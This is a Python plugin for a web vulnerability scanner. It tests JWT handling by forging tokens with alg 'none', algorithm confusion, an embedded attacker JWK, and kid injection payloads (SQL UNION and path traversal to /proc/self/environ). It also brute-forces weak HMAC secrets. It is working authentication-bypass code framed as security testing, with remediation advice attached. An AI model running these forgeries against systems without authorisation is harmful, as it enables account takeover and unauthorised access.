"""
Advanced JWT Attack Scanner — extends the basic jwt_check.py with
algorithm confusion, kid injection, weak secret brute force, and
JWK header injection attacks.
"""
from __future__ import annotations
import base64
import hashlib
import hmac
import json
import re
from ..base_plugin import BasePlugin, ScanTarget, RawFinding
from ..scan_context import ScanContext


# Common weak secrets for brute force
WEAK_SECRETS = [
    "secret", "password", "123456", "changeme", "key",
    "supersecret", "jwt_secret", "mysecret", "default",
    "test", "admin", "qwerty", "letmein", "",  # empty secret
]

# JWT regex
JWT_REGEX = re.compile(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+')


class JWTAdvancedPlugin(BasePlugin):
    name = "JWT Advanced Attack Scanner"
    vuln_type = "jwt_advanced"

    async def scan(self, target: ScanTarget, ctx: ScanContext) -> list[RawFinding]:
        findings: list[RawFinding] = []

        # Find JWTs in response body and headers
        tokens = self._find_jwts(target)
        if not tokens:
            return findings

        for token in tokens:
            header, payload_data = self._decode_jwt(token)
            if not header:
                continue

            alg = header.get("alg", "")

            # Test 1: Algorithm "none" (already in basic check, but more thorough)
            await self._test_alg_none(token, header, payload_data, target, ctx, findings)

            # Test 2: Weak secret brute force (HMAC algorithms)
            if alg.startswith("HS"):
                self._test_weak_secrets(token, header, payload_data, target, findings)

            # Test 3: kid injection
            if "kid" in header:
                await self._test_kid_injection(token, header, payload_data, target, ctx, findings)

            # Test 4: Algorithm confusion (RS256 -> HS256)
            if alg.startswith("RS") or alg.startswith("ES") or alg.startswith("PS"):
                await self._test_alg_confusion(token, header, payload_data, target, ctx, findings)

            # Test 5: JWK header injection
            await self._test_jwk_injection(token, header, payload_data, target, ctx, findings)

        return findings

    def _find_jwts(self, target: ScanTarget) -> list[str]:
        """Find JWT tokens in response body, headers, and cookies."""
        tokens = set()

        # Check response body
        if target.response_body:
            for match in JWT_REGEX.finditer(target.response_body):
                tokens.add(match.group())

        # Check response headers
        for key, val in target.response_headers.items():
            for match in JWT_REGEX.finditer(val):
                tokens.add(match.group())

        # Check cookies
        for key, val in target.cookies.items():
            for match in JWT_REGEX.finditer(val):
                tokens.add(match.group())

        return list(tokens)[:3]  # Limit to 3 tokens

    def _decode_jwt(self, token: str) -> tuple[dict | None, dict | None]:
        """Decode JWT header and payload without verification."""
        try:
            parts = token.split(".")
            if len(parts) != 3:
                return None, None

            header = json.loads(self._base64url_decode(parts[0]))
            payload = json.loads(self._base64url_decode(parts[1]))
            return header, payload
        except Exception:
            return None, None

    @staticmethod
    def _base64url_decode(s: str) -> bytes:
        s += "=" * (4 - len(s) % 4)
        return base64.urlsafe_b64decode(s)

    @staticmethod
    def _base64url_encode(data: bytes) -> str:
        return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

    def _forge_jwt(self, header: dict, payload: dict, secret: bytes = b"") -> str:
        """Create a JWT with the given header, payload, and optional HMAC secret."""
        h = self._base64url_encode(json.dumps(header, separators=(",", ":")).encode())
        p = self._base64url_encode(json.dumps(payload, separators=(",", ":")).encode())
        signing_input = f"{h}.{p}"

        alg = header.get("alg", "none")
        if alg == "none":
            return f"{signing_input}."
        elif alg == "HS256":
            sig = hmac.new(secret, signing_input.encode(), hashlib.sha256).digest()
        elif alg == "HS384":
            sig = hmac.new(secret, signing_input.encode(), hashlib.sha384).digest()
        elif alg == "HS512":
            sig = hmac.new(secret, signing_input.encode(), hashlib.sha512).digest()
        else:
            return f"{signing_input}."

        return f"{signing_input}.{self._base64url_encode(sig)}"

    async def _test_alg_none(
        self, token: str, header: dict, payload: dict,
        target: ScanTarget, ctx: ScanContext, findings: list[RawFinding]
    ) -> None:
        """Test if server accepts 'none' algorithm."""
        for alg_val in ["none", "None", "NONE", "nOnE"]:
            forged_header = {**header, "alg": alg_val}
            forged = self._forge_jwt(forged_header, payload)

            # Send the forged token
            resp = await self._send_with_token(forged, token, target, ctx)
            if resp and self._token_accepted(resp, target):
                findings.append(RawFinding(
                    vuln_type="jwt_alg_none",
                    title=f"JWT: Algorithm 'none' Accepted ({alg_val})",
                    description=(
                        f"The application at {target.url} accepts JWT tokens with "
                        f"algorithm '{alg_val}'. This allows attackers to forge arbitrary "
                        "tokens without any secret key, gaining unauthorized access."
                    ),
                    affected_url=target.url,
                    severity="CRITICAL",
                    payload=forged[:100],
                    request_evidence=f"Authorization: Bearer {forged[:80]}...",
                    response_evidence=f"HTTP {resp.status_code}",
                    remediation=(
                        "Explicitly reject 'none' algorithm in JWT verification. "
                        "Use a whitelist of allowed algorithms: algorithms=['RS256'] or ['HS256']."
                    ),
                    confidence=95,
                    verified=True,
                    business_impact="Complete authentication bypass — attackers can impersonate any user.",
                ))
                return

    def _test_weak_secrets(
        self, token: str, header: dict, payload: dict,
        target: ScanTarget, findings: list[RawFinding]
    ) -> None:
        """Brute force weak HMAC secrets."""
        parts = token.split(".")
        signing_input = f"{parts[0]}.{parts[1]}"
        actual_sig = self._base64url_decode(parts[2])

        alg = header.get("alg", "HS256")
        hash_func = {
            "HS256": hashlib.sha256,
            "HS384": hashlib.sha384,
            "HS512": hashlib.sha512,
        }.get(alg, hashlib.sha256)

        # Also try domain name as secret
        try:
            from urllib.parse import urlparse
            domain = urlparse(target.url).hostname or ""
            secrets_to_try = WEAK_SECRETS + [domain, domain.split(".")[0]]
        except Exception:
            secrets_to_try = WEAK_SECRETS

        for secret in secrets_to_try:
            expected_sig = hmac.new(
                secret.encode(), signing_input.encode(), hash_func
            ).digest()
            if hmac.compare_digest(expected_sig, actual_sig):
                findings.append(RawFinding(
                    vuln_type="jwt_weak_secret",
                    title=f"JWT Signed with Weak Secret: '{secret or '<empty>'}'",
                    description=(
                        f"A JWT token from {target.url} is signed with the weak HMAC secret "
                        f"'{secret or '<empty string>'}'. Attackers can forge valid tokens "
                        "for any user by signing with this known secret."
                    ),
                    affected_url=target.url,
                    severity="CRITICAL" if secret == "" else "HIGH",
                    payload=f"Secret: {secret or '<empty>'}",
                    response_evidence=f"JWT algorithm: {alg}, Token prefix: {token[:50]}...",
                    remediation=(
                        "Use a strong, randomly generated secret (at least 256 bits). "
                        "Consider migrating to asymmetric algorithms (RS256, ES256) "
                        "for better key management."
                    ),
                    confidence=100,
                    verified=True,
                    business_impact="Complete authentication bypass — attacker can sign tokens as any user.",
                ))
                return

    async def _test_kid_injection(
        self, token: str, header: dict, payload: dict,
        target: ScanTarget, ctx: ScanContext, findings: list[RawFinding]
    ) -> None:
        """Test kid parameter injection (SQL injection, path traversal)."""
        kid_payloads = [
            ("' UNION SELECT 'hemis_secret'--", "SQL injection"),
            ("../../../dev/null", "path traversal to /dev/null"),
            ("../../../proc/self/environ", "path traversal to environ"),
        ]

        for kid_val, desc in kid_payloads:
            forged_header = {**header, "kid": kid_val}

            # For SQL injection kid, try signing with the injected value
            if "UNION" in kid_val:
                forged = self._forge_jwt(
                    {**forged_header, "alg": "HS256"}, payload,
                    secret=b"hemis_secret"
                )
            else:
                # For /dev/null path traversal, key would be empty
                forged = self._forge_jwt(
                    {**forged_header, "alg": "HS256"}, payload,
                    secret=b""
                )

            resp = await self._send_with_token(forged, token, target, ctx)
            if resp and self._token_accepted(resp, target):
                findings.append(RawFinding(
                    vuln_type="jwt_kid_injection",
                    title=f"JWT kid Injection: {desc}",
                    description=(
                        f"The application at {target.url} is vulnerable to JWT kid "
                        f"parameter injection via {desc}. The forged token with "
                        f"kid='{kid_val}' was accepted, allowing authentication bypass."
                    ),
                    affected_url=target.url,
                    affected_parameter="kid (JWT header)",
                    severity="CRITICAL",
                    payload=f"kid: {kid_val}",
                    response_evidence=f"HTTP {resp.status_code}",
                    remediation=(
                        "Validate and sanitize the kid parameter. Use a whitelist of "
                        "allowed key IDs. Never use kid directly in file paths or SQL queries."
                    ),
                    confidence=90,
                    verified=True,
                ))
                return

    async def _test_alg_confusion(
        self, token: str, header: dict, payload: dict,
        target: ScanTarget, ctx: ScanContext, findings: list[RawFinding]
    ) -> None:
        """Test algorithm confusion attack (RS256 -> HS256)."""
        # We need the server's public key for this attack
        # Try to fetch it from common JWKS endpoints
        base = ctx.target_url.rstrip("/")
        jwks_paths = [
            "/.well-known/jwks.json",
            "/oauth/jwks",
            "/auth/jwks",
            "/.well-known/openid-configuration",
        ]

        public_key = None
        for path in jwks_paths:
            url = f"{base}{path}"
            resp = await self._send_request(ctx, url)
            if resp and resp.status_code == 200:
                try:
                    data = json.loads(resp.text)
                    # If it's OIDC config, get the jwks_uri
                    if "jwks_uri" in data:
                        resp2 = await self._send_request(ctx, data["jwks_uri"])
                        if resp2:
                            data = json.loads(resp2.text)

                    if "keys" in data and data["keys"]:
                        # Store the raw JWKS key for the confusion attack
                        public_key = json.dumps(data["keys"][0]).encode()
                        break
                except (json.JSONDecodeError, TypeError, KeyError):
                    continue

        if public_key:
            # Try HS256 with the public key as the HMAC secret
            confused_header = {**header, "alg": "HS256"}
            forged = self._forge_jwt(confused_header, payload, secret=public_key)

            resp = await self._send_with_token(forged, token, target, ctx)
            if resp and self._token_accepted(resp, target):
                findings.append(RawFinding(
                    vuln_type="jwt_algorithm_confusion",
                    title="JWT Algorithm Confusion: RS256 → HS256",
                    description=(
                        f"The application at {target.url} is vulnerable to JWT algorithm "
                        "confusion. By switching from RS256 to HS256 and signing with the "
                        "server's public key (obtained from JWKS), the forged token was "
                        "accepted. This allows complete authentication bypass."
                    ),
                    affected_url=target.url,
                    severity="CRITICAL",
                    payload=f"Changed alg from {header.get('alg')} to HS256, signed with public key",
                    response_evidence=f"HTTP {resp.status_code}",
                    remediation=(
                        "Enforce algorithm validation: verify tokens with the expected algorithm "
                        "only. Use algorithms=['RS256'] explicitly. Never allow the token to "
                        "dictate which algorithm to use."
                    ),
                    confidence=95,
                    verified=True,
                    business_impact="Complete authentication bypass — attacker can impersonate any user using the public key.",
                ))

    async def _test_jwk_injection(
        self, token: str, header: dict, payload: dict,
        target: ScanTarget, ctx: ScanContext, findings: list[RawFinding]
    ) -> None:
        """Test JWK header injection — embed attacker's key in the token."""
        # This is a simplified test — we check if the server honors the jwk header
        # by embedding a known HMAC key
        attacker_jwk = {
            "kty": "oct",
            "k": self._base64url_encode(b"hemis-attacker-key"),
            "alg": "HS256",
        }
        forged_header = {**header, "alg": "HS256", "jwk": attacker_jwk}
        forged = self._forge_jwt(forged_header, payload, secret=b"hemis-attacker-key")

        resp = await self._send_with_token(forged, token, target, ctx)
        if resp and self._token_accepted(resp, target):
            findings.append(RawFinding(
                vuln_type="jwt_jwk_injection",
                title="JWT JWK Header Injection",
                description=(
                    f"The application at {target.url} accepts JWT tokens with an embedded "
                    "JWK (JSON Web Key) in the header. An attacker can provide their own "
                    "signing key inside the token, completely bypassing signature verification."
                ),
                affected_url=target.url,
                severity="CRITICAL",
                payload="Embedded attacker JWK in token header",
                response_evidence=f"HTTP {resp.status_code}",
                remediation=(
                    "Never trust JWK keys embedded in the token header. "
                    "Always verify tokens against keys fetched from a trusted JWKS endpoint."
                ),
                confidence=95,
                verified=True,
            ))

    async def _send_with_token(
        self, forged_token: str, original_token: str,
        target: ScanTarget, ctx: ScanContext
    ):
        """Send a request with the forged token, replacing the original."""
        headers = dict(target.headers)

        # Try Authorization header first
        headers["Authorization"] = f"Bearer {forged_token}"

        # Also replace in cookies
        cookies = dict(target.cookies)
        for key, val in cookies.items():
            if original_token in val:
                cookies[key] = val.replace(original_token, forged_token)

        return await self._send_request(
            ctx, target.url, headers=headers, cookies=cookies
        )

    def _token_accepted(self, resp, target: ScanTarget) -> bool:
        """Check if the response indicates the token was accepted."""
        if resp.status_code in (401, 403):
            return False
        if resp.status_code == target.response_status:
            return True
        if resp.status_code < 400:
            return True
        return False
